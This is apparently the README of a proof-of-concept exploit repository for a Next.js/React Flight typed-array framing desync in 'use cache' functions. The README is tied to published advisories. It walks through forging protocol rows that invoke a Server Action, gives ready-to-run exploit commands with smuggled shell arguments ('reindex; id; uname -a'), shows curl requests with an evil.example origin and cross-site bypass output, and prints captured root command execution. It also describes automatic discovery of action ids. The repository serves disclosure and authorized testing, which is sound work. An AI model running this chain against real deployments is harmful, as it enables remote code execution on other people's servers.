# Next.js `use cache` typed-array desync → RCE

## Blog post: https://hash-sec.com/blog/the-use-cache-rce-how-a-typed-array-bug-in-nextjs-became-remote-code-execution

Proof of concept for the React Flight framing bug that shipped as
[GHSA-673q-mjm6-r5xr](https://github.com/vercel/next.js/security/advisories/GHSA-673q-mjm6-r5xr)
(Next.js) and
[GHSA-xqc2-xf4c-x3h3](https://github.com/facebook/react/security/advisories/GHSA-xqc2-xf4c-x3h3)
(React).

A `use cache` function that returns **multiple typed arrays** produces a cached
Flight stream the server can no longer read back correctly. The broken framing
lets an attacker place **forged protocol rows** at the decoder's resume offset,
and those rows invoke a **Server Action with attacker-chosen arguments**.

Affected: Next.js `>= 16.0.0, <= 16.4.0` - patched in **16.4.1**.
React: `react-server-dom-{webpack,turbopack,parcel}` `19.0.0–19.0.8`,
`19.1.0–19.1.9`, `19.2.0–19.2.8`, `19.3.0` - patched in `19.0.9`, `19.1.10`,
`19.2.9`, `19.3.1`.

## Legal!!!

For research and authorized testing only. The apps in this repository are
intentionally vulnerable, never deploy them to a public network.

## Quick start

```bash
./run.sh
```

This builds two images (vulnerable `16.4.0`, patched `16.4.1`), starts them on
`http://127.0.0.1:3000` and `http://127.0.0.1:3001`, and runs all three steps
against both.

Manual equivalent:

```bash
docker compose up -d --build

node exploit/probe.mjs  http://127.0.0.1:3000 http://127.0.0.1:3001
node exploit/inject.mjs http://127.0.0.1:3000
node exploit/rce.mjs    http://127.0.0.1:3000 'reindex; id; uname -a'
```

The scripts in `exploit/` are pure Node (no dependencies) and talk to the target
over HTTP only - no shell access to the container is used.

## The app under test

`app/` is a small internal service - an artifact browser with an ops console:

- **`/` (`app/app/page.jsx`)** - the artifact page. It calls the cached lookup
  `getArtifactBlocks(annotation)` and resolves the cached value before render.
  The `annotation` query parameter is the caller-supplied bytes, with no
  parameter the page renders without touching the cache. On `16.4.0` that call
  always fails its own cache read-back, so the page only makes it when a preview
  is actually requested - otherwise the target's front page would be a 500.
- **`app/app/console.jsx`** - `OperatorConsole`, a client component. It imports
  the `runMaintenanceJob` Server Action, and renders its buttons **only for
  operators**. Anonymous visitors get the sentence *"Maintenance jobs are
  available to operator accounts."* and nothing else.
- **`app/app/actions.js`** - `runMaintenanceJob`, a thin wrapper around the ops
  helper `/usr/local/bin/artifacts-maintenance` that the image ships. This is a
  stand-in for the "shell out to our internal tool" actions real services
  contain.
- **`/api/payload`** - health check that calls the same cached lookup with an
  empty payload, so a broken read-back surfaces as a 500.
- **`/api/session?operator=1`** - lab affordance that sets the operator cookie,
  so you can look at the console the way a real operator would.

The console is the only thing that is *supposed* to reach
`runMaintenanceJob`, and it only ever sends the three preset job ids
(`reindex`, `verify`, `prune`). There is no free-text field anywhere in the UI.
The exploit below reaches the same action with an argument the console would
never produce.

## The bug in four steps

**1. The vulnerable shape.** A cached function returns two `>4096`-byte partial
views over *one* shared `ArrayBuffer`, plus one attacker-influenced field:

```js
async function getArtifactBlocks(annotationB64) {
  'use cache';
  const buf = new ArrayBuffer(16384);
  const block0 = new Uint8Array(buf, 0, 8192);
  const block1 = new Uint8Array(buf, 8192, 8192);
  const raw = Buffer.from(annotationB64 || '', 'base64');
  return { block0, block1, annotation: new Uint8Array(raw) };
}
```

**2. The serializer desyncs.** Writing the first view transfers/detaches the
shared buffer, so when the serializer gets to the second view it observes
`byteLength === 0` and drops the payload - but the row header was already
emitted with the original length:

```
2:o2000,<8192 bytes of block0>
3:o2000,                            <- header written, payload dropped
4:o<len>,<attacker blob>
1:{"block0":"$2","block1":"$3","annotation":"$4"}
```

Flight rows are either newline-terminated or length-declared, `o` rows are
length-declared, so the decoder consumes exactly the declared number of bytes.
Reading the cache back, it consumes `8192` bytes after `3:o2000,` - the
`annotation` header plus the start of the attacker blob - and then **resumes
parsing inside attacker-controlled bytes**.

**3. The attacker aligns forged rows.** The forged rows must land exactly at
`8192 - len("<cid>:o<hexlen>,")` bytes into the blob, which is a fixed point
because the header length depends on the blob length (see `buildBlob()` in
`exploit/lib.mjs`).

**4. The forged rows invoke a Server Action.**

```
6:["reindex; id"]                                 bound arguments
5:{"id":"<action id>","bound":"$@6"}              a real Server Action reference
4:{"then":"$h5"}                                  the cached value becomes a thenable
```

The page awaits the cached value. React loads `$h5` as a server reference, and
`19.3.0`'s `loadServerReference` had no `then` guard - so `annotation.then` *is*
the real server function. Calling `then(resolve, reject)` invokes it with the
attacker's bound arguments.

## What each step proves

| Step | Request | Vulnerable | Patched |
|---|---|---|---|
| `probe.mjs` | `GET /api/payload` | `500 Connection closed.` | `200`, both views intact |
| `inject.mjs` | `GET /?annotation=<blob>` | `annotation` replaced by attacker object | blob stays opaque |
| `rce.mjs` | `GET /?annotation=<blob>` | action output returned | not exploited |

`rce.mjs` targets the **rendered page**, not the health check, because resolving
a server reference needs Next's render-time module loader
(`globalThis.__next_require__`) to be installed. A bare Route Handler exercises
the desync but not the action invocation.

## Example output

Real captured output, with ports normalized to the ones used above. The action
id and the container hostname differ on every build/run.

**Step 1 - framing desync (`probe.mjs`)**

```
$ node exploit/probe.mjs http://127.0.0.1:3000 http://127.0.0.1:3001
http://127.0.0.1:3000/api/payload
  HTTP 500  DESYNC (vulnerable)
  {"ok":false,"error":"Connection closed."}
http://127.0.0.1:3001/api/payload
  HTTP 200  INTACT (patched)
  {"ok":true,"block0":8192,"block1":8192,"first0":65,"first1":66}

OVERALL: at least one target desynced
```

**Step 2 - controlled deserialization (`inject.mjs`)**

```
$ node exploit/inject.mjs http://127.0.0.1:3000
target     : http://127.0.0.1:3000/
blob       : 8204 bytes, forged rows at offset 8184
forged rows: "4:{\"INJECTED\":true}\n"

HTTP 200
rendered   : {"block0":8192,"block1":8192,"annotation":{"INJECTED":true}}

>>> attacker bytes were parsed as Flight protocol rows (annotation replaced)
```

The identical request against the patched build - the blob stays opaque:

```
$ node exploit/inject.mjs http://127.0.0.1:3001
target     : http://127.0.0.1:3001/
blob       : 8204 bytes, forged rows at offset 8184
forged rows: "4:{\"INJECTED\":true}\n"

HTTP 200
rendered   : {"block0":8192,"block1":8192,"annotation":"Uint8Array(8204)"}

>>> blob stayed opaque (patched runtime)
```

**Step 3 - full chain (`rce.mjs`)**

```
$ node exploit/rce.mjs http://127.0.0.1:3000 'reindex; id; uname -a'
target     : http://127.0.0.1:3000/
action id  : 7f0ecb0ef39cbaec2d2e463e10285ee4f83172d70f
job        : "reindex; id; uname -a"
blob       : 8297 bytes, forged rows at offset 8184

HTTP 200
================ action output ================
reindexed 128 artifacts
uid=0(root) gid=0(root) groups=0(root)
Linux e42e065cc5b6 7.0.14-linuxkit #1 SMP PREEMPT Fri Sep 18 10:19:32 UTC 2026 aarch64 GNU/Linux
==============================================
>>> runMaintenanceJob executed with attacker-chosen argument
```

Against the patched build the same payload is inert:

```
$ node exploit/rce.mjs http://127.0.0.1:3001 'reindex; id; uname -a'
target     : http://127.0.0.1:3001/
action id  : 7fab87d8410653f183cffff254f8c8b5e282bd4aed
job        : "reindex; id; uname -a"
blob       : 8297 bytes, forged rows at offset 8184

HTTP 200
rendered   : {"block0":8192,"block1":8192,"annotation":"Uint8Array(8297)"}
>>> not exploited
```

## Direct invocation vs. the desync path

The action id is public here, so it is fair to ask what the CVE adds: a plain
action POST with a known id reaches the same action. The answer is *which
requests the framework lets through*.

**A. Direct action POST, same-origin** - works. This is the app's own bug, not
this CVE: the action trusts its caller.

```
$ curl -s -X POST http://127.0.0.1:3000/ \
    -H "Next-Action: 7f53d9d36ba139e670bd3f020383ce27513b7095fa" \
    -H 'content-type: text/plain;charset=UTF-8' --data-binary '["reindex"]'
0:{"a":"$@1","q":"","i":false,"b":"sHk6d0AYNfzGbkINKo41S"}
1:"reindexed 128 artifacts\n"
```

**B. Direct action POST, cross-site** - refused. Next.js checks the `Origin` of
Server Action requests, so a page on another site cannot drive an action through
a victim's browser. The custom `Next-Action` header also forces a CORS preflight
for any cross-origin `fetch`.

```
$ curl -s -X POST http://127.0.0.1:3000/ \
    -H "Next-Action: 7f53d9d36ba139e670bd3f020383ce27513b7095fa" \
    -H "Origin: https://evil.example" \
    -H 'content-type: text/plain;charset=UTF-8' --data-binary '["reindex"]'
HTTP 500
0:{"a":"$@1","q":"","i":false,"b":"sHk6d0AYNfzGbkINKo41S"}
1:E{"digest":"1525810078"}
```

**C. The desync path, cross-site** - accepted, and the action runs:

```
$ node exploit/rce.mjs http://127.0.0.1:3000 'reindex; id' --origin https://evil.example
target     : http://127.0.0.1:3000/
action id  : 7f53d9d36ba139e670bd3f020383ce27513b7095fa
job        : "reindex; id"
blob       : 8287 bytes, forged rows at offset 8184
origin     : https://evil.example (cross-site)

HTTP 200
================ action output ================
reindexed 128 artifacts
uid=0(root) gid=0(root) groups=0(root)
==============================================
>>> runMaintenanceJob executed with attacker-chosen argument
```

`GET /?annotation=<blob>` is **not an action request**, so none of the action
transport applies to it: no `Origin` check, no `Next-Action` header, no
preflight. The invocation happens inside the server's own cache read. That is
what the CVE adds over a badly-written action - a primitive that fires from an
ordinary page load.

## How `rce.mjs` finds the action id

Ids are not secrets - they ship to the browser. The console's buttons are
rendered only for operators, so an anonymous request to `/` contains no
`$ACTION_ID_` form field and no button. The id is still in the JavaScript: the
`OperatorConsole` client chunk is part of the page's module graph and contains
`createServerReference("<id>", ...)`.

`discoverActionId()` in `exploit/lib.mjs` tries the progressive-enhancement
field first and falls back to scanning the page's script chunks, so the exploit
needs no prior knowledge of the deployment. `--action-id <hex>` overrides it.

## Honest scope

The bug itself is a **deserialization / framing primitive**. Turning it into
command execution depends on the application:

- The app must have a `use cache` function that returns multiple typed arrays
  (the advisory's stated precondition).
- The app must have a Server Action that an attacker benefits from invoking.
  This lab ships one on purpose (`runMaintenanceJob` in `app/app/actions.js`,
  a stand-in for "run our CLI" / "shell out to a build tool" actions real apps
  contain).
- The attacker must know the action's id, which is public by construction here.

Without an interesting action to reach, the impact is one attacker-chosen
server function call with attacker-chosen arguments, plus the desync itself.

Three things this lab does **not** claim:

- **The action is not "unprotected RCE by design".** It is a CLI wrapper whose
  only restriction is that the console UI sends preset job ids. That is the
  anti-pattern the bug punishes: authorization that lives in the UI is not a
  control. An app that validates inside the action (allow-listing the job id,
  checking a session server-side) is not exploitable this way, even though it is
  still affected by the desync.
- **No generic RCE.** The primitive gives invocation, not a gadget. If your app
  has no dangerous Server Action in the module graph of a page that calls a
  multi-typed-array `use cache` function, there is nothing to invoke.
- **The desync is not the only way to reach a badly-written action.** If the
  action has no authorization of its own, case A above shows a direct POST
  reaching it with no CVE involved at all. The CVE is what makes the invocation
  possible where the framework's own checks are supposed to apply - case B
  works, case C does not get stopped - and where the attacker has the id but no
  usable way to drive an action request.

The desync itself is unconditional on the affected versions: on `16.4.0` a page
that calls such a cached function fails its own cache read-back. `/api/payload`
in this lab reproduces that without any attacker input at all.

## Fix

React `19.3.1` copies partial views before transport (`view.slice()` when the
view does not cover its whole buffer) and refuses detached buffers outright.
Next.js `16.4.1` ships that runtime. Upgrade - the advisory notes there is no
workaround for applications with such `use cache` functions.
